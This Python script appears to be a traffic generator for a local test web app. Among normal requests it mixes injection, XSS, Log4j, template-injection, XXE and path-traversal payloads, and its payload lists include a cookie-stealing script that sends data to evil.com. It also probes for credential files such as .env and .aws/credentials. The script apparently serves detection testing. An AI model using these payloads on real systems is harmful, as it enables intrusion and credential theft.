import requests
import time
import random
import argparse
import json
import os


class HermesContentGenerator:
    """Generate realistic dynamic content using uncloseai.com Hermes API"""

    def __init__(self, api_key=None):
        self.api_key = api_key or os.getenv("HERMES_API_KEY")
        self.base_url = "https://uncloseai.com/v1/chat/completions"
        self.session = requests.Session()

        if self.api_key:
            self.session.headers.update(
                {
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/json",
                }
            )

        # Content templates for different scenarios
        self.content_prompts = [
            "Generate a realistic code snippet in Python for data processing",
            "Create a realistic configuration file (JSON) for a web application",
            "Generate a realistic log entry from a web server",
            "Create a realistic bash script for system maintenance",
            "Generate realistic SQL query for data analysis",
            "Create a realistic JavaScript function for form validation",
            "Generate a realistic Docker configuration file",
            "Create a realistic API response in JSON format",
            "Generate a realistic cron job configuration for backups",
            "Create a realistic nginx server configuration",
            "Generate realistic Python requirements.txt file",
            "Create a realistic HTML template snippet",
            "Generate realistic CSS styles for a dashboard",
            "Create a realistic database schema definition",
            "Generate realistic environment variables configuration",
        ]

    def generate_content(self, max_tokens=200):
        """Generate realistic legitimate content using Hermes API"""

        if not self.api_key:
            # Fallback to static content if no API key
            return self._fallback_content()

        try:
            prompt = random.choice(self.content_prompts)

            payload = {
                "model": "hermes-3-llama-3.1-405b",
                "messages": [
                    {
                        "role": "system",
                        "content": "You are a realistic content generator. Generate only the requested content without explanations or comments.",
                    },
                    {"role": "user", "content": prompt},
                ],
                "max_tokens": max_tokens,
                "temperature": 0.8,
                "stream": False,
            }

            response = self.session.post(self.base_url, json=payload, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if "choices" in data and data["choices"]:
                    content = data["choices"][0]["message"]["content"].strip()
                    return content
                else:
                    print(f"Warning: Unexpected Hermes API response format")
                    return self._fallback_content()
            else:
                print(
                    f"Warning: Hermes API error {response.status_code}: {response.text}"
                )
                return self._fallback_content()

        except requests.exceptions.RequestException as e:
            print(f"Warning: Hermes API request failed: {e}")
            return self._fallback_content()
        except Exception as e:
            print(f"Warning: Hermes API error: {e}")
            return self._fallback_content()

    def _fallback_content(self):
        """Fallback static legitimate content when API is unavailable"""

        fallback_content = [
            "#!/bin/bash\n# System backup script\ncp -r /home/user/documents /backup/\necho 'Backup completed'",
            '{\n  "database": {\n    "host": "localhost",\n    "port": 5432,\n    "name": "webapp_db"\n  }\n}',
            "import requests\nresponse = requests.get('https://api.example.com/data')\nprint(response.json())",
            "SELECT u.username, u.email, p.title FROM users u JOIN posts p ON u.id = p.user_id WHERE u.active = 1;",
            "server {\n  listen 80;\n  server_name example.com;\n  root /var/www/html;\n  index index.html;\n}",
            "from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/api/health')\ndef health():\n    return jsonify({'status': 'ok'})",
            "version: '3.8'\nservices:\n  web:\n    image: nginx:alpine\n    ports:\n      - '80:80'\n    volumes:\n      - ./html:/usr/share/nginx/html",
            "CREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  username VARCHAR(50) UNIQUE NOT NULL,\n  email VARCHAR(100),\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);",
        ]

        return random.choice(fallback_content)


def crawl_v3(
    enable_malicious_gets=True,
    enable_wrong_verbs=True,
    enable_nasty_posts=True,
    enable_hermes=True,
):
    """
    V3 Crawler with enhanced chaos patterns:
    - Malicious GET requests to common attack targets
    - Wrong HTTP verbs on endpoints
    - Nasty POST requests to GET endpoints
    - Random/malformed URLs
    - Mix of user agent anomalies from v2
    """
    base_url = "http://localhost:6543"
    normal_endpoints = ["/", "/hello"]

    # Normal user agents with version variation
    normal_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    ]

    # Malicious user agents with version variation
    malicious_user_agents = [
        "sqlmap/1.4.7#stable (http://sqlmap.org)",
        "sqlmap/1.5.2#stable (http://sqlmap.org)",
        "sqlmap/1.6.12#stable (http://sqlmap.org)",
        "nikto/2.1.5",
        "nikto/2.1.6",
        "nikto/2.5.0",
        "curl/7.68.0",
        "curl/7.81.0",
        "curl/8.1.2",
        "Python-urllib/3.8",
        "Python-urllib/3.9",
        "Python-urllib/3.11",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "nmap/7.80 NSE",
        "nmap/7.93 NSE",
        "nmap/7.94 NSE",
        "masscan/1.0",
        "masscan/1.3.2",
        "WPScan v3.8.7",
        "WPScan v3.8.22",
        "WPScan v3.8.24",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
    ]

    # Malicious GET endpoints (common attack targets) - removed duplicates
    malicious_get_paths = [
        "/admin",
        "/wp-admin",
        "/phpmyadmin",
        "/.env",
        "/.git/config",
        "/backup.sql",
        "/wp-config.php",
        "/config.php.bak",
        "/shell.php",
        "/cmd.php",
        "/.ssh/id_rsa",
        "/api/v1/users/dump",
        "/debug/vars",
        "/.aws/credentials",
        "/etc/passwd",
        "/proc/self/environ",
        "/var/log/nginx/access.log",
        "/var/www/html/config.ini",
        "/robots.txt",
        "/sitemap.xml",
    ]

    # Wrong HTTP verbs to try on normal endpoints
    wrong_verbs = ["TRACE", "OPTIONS", "PUT", "DELETE", "PATCH", "HEAD"]

    # Malicious POST payloads
    malicious_post_payloads = [
        "'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "../../etc/passwd",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "; cat /etc/passwd",
        "| whoami",
        "`id`",
        "../../../windows/system32/config/sam",
    ]

    # Malicious pastebin GET attacks (targeting /pastebin/{id} endpoint)
    malicious_pastebin_gets = [
        "/pastebin/../../etc/passwd",
        "/pastebin/../../../etc/shadow", 
        "/pastebin/1' OR '1'='1--",
        "/pastebin/<script>alert(1)</script>",
        "/pastebin/999999999999999999999",  # Integer overflow
        "/pastebin/-1",  # Negative ID
        "/pastebin/admin",  # Non-numeric ID
        "/pastebin/0x41414141",  # Hex injection
        "/pastebin/%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL-encoded path traversal
        "/pastebin/1;DROP%20TABLE%20pastes;--",  # SQL injection in URL
        "/pastebin/{{7*7}}",  # Template injection
        "/pastebin/${jndi:ldap://evil.com/a}",  # Log4j injection
    ]

    # Malicious INSERT POST payloads (more advanced attacks)
    malicious_insert_payloads = [
        # SQL injection attempts
        "'; DROP TABLE pastes; --",
        "admin' OR '1'='1' UNION SELECT password FROM users--",
        "1'; INSERT INTO pastes (content) VALUES ('HACKED'); --",
        
        # XSS payloads
        "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert('XSS')",
        
        # Template injection
        "{{7*7}}",
        "#{7*7}",
        "${7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        
        # Command injection  
        "; cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(whoami)",
        
        # Path traversal
        "../../etc/passwd",
        "../../../windows/system32/config/sam",
        "..\\..\\..\\windows\\system32\\config\\sam",
        
        # Log4j injection
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
        "${jndi:dns://evil.com}",
        
        # XXE injection
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        
        # Deserialization attacks
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",  # PHP serialized
        
        # Large payload (DoS attempt)
        "A" * 10000,
        
        # Binary data injection
        "\\x00\\x01\\x02\\x03\\xFF\\xFE\\xFD",
    ]

    # Random/malformed URLs  
    random_urls = [
        "/admin/../../../etc/passwd",
        "/index.php?id=1' OR 1=1--",
        "/search?q=<script>alert(1)</script>",
        "/login.php?user=admin&pass=admin",
        "/api/v1/../../../etc/passwd",
        "/cgi-bin/test.cgi",
        "/scripts/..%2f../winnt/system32/cmd.exe",
        "/null%00.html",
    ]

    # Initialize Hermes content generator
    hermes = HermesContentGenerator() if enable_hermes else None
    if hermes and hermes.api_key:
        print("✓ Hermes API integration enabled")
    else:
        print("○ Using fallback static content (no HERMES_API_KEY found)")

    total_requests = 1000
    anomaly_count = 10  # 1% chaos

    # Track pastebin usage for realistic behavior
    pastebin_usage = {"normal_posts": 0, "suspicious_posts": 0, "malicious_posts": 0}
    
    # Track inserted paste IDs for subsequent retrieval
    inserted_paste_ids = []
    pending_paste_gets = []  # Queue of paste IDs to retrieve

    # Distribute anomaly types - add pastebin-specific attacks
    anomaly_types = []
    type_distribution = {
        "malicious_ua": 1,  # Reduced user agent anomalies
        "malicious_get": 2 if enable_malicious_gets else 0,  # General malicious GETs
        "wrong_verb": 2 if enable_wrong_verbs else 0,  # HTTP verb anomalies
        "nasty_post": 1 if enable_nasty_posts else 0,  # POST to GET endpoints
        "malicious_pastebin_get": 2,  # NEW: Malicious pastebin GET attacks
        "malicious_insert_post": 2,  # NEW: Malicious INSERT POST attacks
        "random_url": 0,  # Keep random URLs disabled
    }

    # Adjust if some features disabled
    total_enabled = sum(type_distribution.values())
    remaining = anomaly_count - total_enabled
    if remaining > 0:
        type_distribution["malicious_ua"] += remaining

    # Build anomaly list
    for anomaly_type, count in type_distribution.items():
        anomaly_types.extend([anomaly_type] * count)

    # Shuffle and assign to request indices
    random.shuffle(anomaly_types)
    anomaly_indices = sorted(
        random.sample(range(1, total_requests + 1), len(anomaly_types))
    )
    anomaly_assignments = dict(zip(anomaly_indices, anomaly_types))

    print(f"Starting V3 Chaos Crawler for {total_requests} requests...")
    print(f"Chaos Configuration:")
    print(f"  Malicious GETs: {'✓' if enable_malicious_gets else '✗'}")
    print(f"  Wrong HTTP verbs: {'✓' if enable_wrong_verbs else '✗'}")
    print(f"  Nasty POSTs: {'✓' if enable_nasty_posts else '✗'}")
    print(f"Anomaly distribution: {type_distribution}")
    print(f"Anomaly requests: {anomaly_indices}")
    print()

    start_time = time.time()

    for i in range(1, total_requests + 1):
        # Default normal request setup
        method = "GET"
        headers = {"User-Agent": random.choice(normal_user_agents)}
        data = None

        # Check if we should retrieve a paste we posted earlier
        should_get_paste = (
            len(pending_paste_gets) > 0 and 
            random.random() < 0.3  # 30% chance to retrieve if we have pending GETs
        )
        
        if should_get_paste:
            # GET a paste we inserted earlier
            paste_id = pending_paste_gets.pop(0)  # FIFO
            endpoint = f"/pastebin/{paste_id}"
            method = "GET"
        else:
            # Normal endpoint selection with occasional pastebin usage
            rand = random.random()
            if rand < 0.55:  # 55% home (reduced slightly)
                endpoint = "/"
            elif rand < 0.75:  # 20% hello (reduced slightly) 
                endpoint = "/hello"
            elif rand < 0.80:  # 5% pastebin list
                endpoint = "/pastebin"
                method = "GET"
            else:  # 20% legitimate pastebin POST (increased)
                endpoint = "/insert"
                method = "POST"
                
                # Generate realistic legitimate content for POST requests only
                if hermes:
                    data = hermes.generate_content(max_tokens=200)
                    content_source = "Hermes-generated"
                else:
                    data = (
                        hermes._fallback_content()
                        if hermes
                        else random.choice(
                            [
                                "#!/bin/bash\necho 'System maintenance script'\nps aux | grep nginx",
                                "SELECT * FROM users WHERE created_at > '2024-01-01' ORDER BY id DESC LIMIT 100;",
                                "import json\nwith open('config.json', 'r') as f:\n    config = json.load(f)",
                            ]
                        )
                    )
                    content_source = "static"

                pastebin_usage["normal_posts"] += 1

                if i % 50 == 0:  # Log some legitimate posts
                    print(
                        f"Request #{i}: Legitimate {content_source} POST to /insert: {data[:30]}..."
                    )

        url = base_url + endpoint

        # Apply anomaly if this is an anomaly request
        if i in anomaly_assignments:
            anomaly_type = anomaly_assignments[i]

            if anomaly_type == "malicious_ua":
                headers["User-Agent"] = random.choice(malicious_user_agents)
                print(
                    f"Request #{i}: ANOMALY - Malicious UA: {headers['User-Agent'][:50]}..."
                )

            elif anomaly_type == "malicious_get":
                endpoint = random.choice(malicious_get_paths)
                url = base_url + endpoint
                print(f"Request #{i}: ANOMALY - Malicious GET: {endpoint}")

            elif anomaly_type == "wrong_verb":
                method = random.choice(wrong_verbs)
                print(f"Request #{i}: ANOMALY - Wrong verb {method} on {endpoint}")

            elif anomaly_type == "nasty_post":
                # POST legitimate content to wrong endpoints (behavioral anomaly)
                method = "POST"

                # Generate realistic legitimate content
                if hermes:
                    data = hermes.generate_content(max_tokens=150)
                    content_source = "Hermes-generated"
                else:
                    data = (
                        hermes._fallback_content()
                        if hermes
                        else random.choice(malicious_post_payloads)
                    )
                    content_source = "static"

                # The anomaly is POSTing to GET endpoints, not the content itself
                print(
                    f"Request #{i}: ANOMALY - POST {content_source} content to GET endpoint {endpoint}: {data[:30]}..."
                )
                pastebin_usage["normal_posts"] += 1

            elif anomaly_type == "malicious_pastebin_get":
                # Malicious GET attacks targeting pastebin endpoints
                endpoint = random.choice(malicious_pastebin_gets)
                url = base_url + endpoint
                method = "GET"
                print(f"Request #{i}: ANOMALY - Malicious pastebin GET: {endpoint}")

            elif anomaly_type == "malicious_insert_post":
                # Malicious POST attacks targeting insert endpoint
                endpoint = "/insert"
                method = "POST"
                data = random.choice(malicious_insert_payloads)
                print(f"Request #{i}: ANOMALY - Malicious INSERT POST: {data[:30]}...")
                pastebin_usage["malicious_posts"] += 1

            elif anomaly_type == "random_url":
                url = base_url + random.choice(random_urls)
                print(f"Request #{i}: ANOMALY - Random URL: {url}")

        # Make the request
        try:
            if method == "GET":
                response = requests.get(url, headers=headers)
            elif method == "POST":
                response = requests.post(url, headers=headers, data=data)
            else:
                # For other HTTP verbs
                response = requests.request(method, url, headers=headers)
            
            # Capture paste ID from successful POST to /insert
            if (method == "POST" and endpoint == "/insert" and 
                response.status_code == 200 and not (i in anomaly_assignments)):
                try:
                    result = response.json()
                    if result.get("success") and "id" in result:
                        paste_id = result["id"]
                        inserted_paste_ids.append(paste_id)
                        # Queue for retrieval later (with some randomness)
                        if random.random() < 0.7:  # 70% chance to queue for retrieval
                            pending_paste_gets.append(paste_id)
                except (ValueError, KeyError):
                    pass  # Ignore JSON parsing errors

            if i % 100 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed
                print(
                    f"Request #{i}: {method} {url} - Status: {response.status_code} ({rate:.1f} req/s)"
                )

        except requests.exceptions.RequestException as e:
            print(f"Request #{i}: {method} {url} - FAILED: {e}")

        # Short delay
        time.sleep(random.uniform(0.01, 0.03))

    elapsed_time = time.time() - start_time
    print(f"\nV3 Chaos Crawler finished!")
    print(f"Total requests: {total_requests}")
    print(f"Total time: {elapsed_time:.2f} seconds")
    print(f"Average rate: {total_requests/elapsed_time:.2f} requests/second")
    print(f"Chaos requests: {len(anomaly_indices)}")
    print(f"Pastebin usage: {pastebin_usage['normal_posts']} legitimate posts, {pastebin_usage['malicious_posts']} malicious posts")
    print(f"Paste IDs captured: {len(inserted_paste_ids)}")
    print(f"Pending paste GETs: {len(pending_paste_gets)}")

    # Print hermes API usage
    if hermes and hermes.api_key:
        print("✓ Hermes API provided dynamic content")
    else:
        print("○ Used static fallback content")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="V3 Chaos Crawler with enhanced anomaly patterns"
    )
    parser.add_argument(
        "--no-malicious-gets",
        action="store_true",
        help="Disable malicious GET requests to attack targets",
    )
    parser.add_argument(
        "--no-wrong-verbs",
        action="store_true",
        help="Disable wrong HTTP verbs on endpoints",
    )
    parser.add_argument(
        "--no-nasty-posts",
        action="store_true",
        help="Disable POST requests to GET endpoints",
    )
    parser.add_argument(
        "--no-hermes",
        action="store_true",
        help="Disable Hermes API integration (use static content)",
    )

    args = parser.parse_args()

    print("Starting V3 Chaos Crawler...")
    print("Make sure the Pyramid app is running on http://localhost:6543")
    print("This will generate 1000 requests with 10 diverse anomalies (1%)")
    time.sleep(2)

    crawl_v3(
        enable_malicious_gets=not args.no_malicious_gets,
        enable_wrong_verbs=not args.no_wrong_verbs,
        enable_nasty_posts=not args.no_nasty_posts,
        enable_hermes=not args.no_hermes,
    )

    print("\nV3 Chaos Crawler finished!")
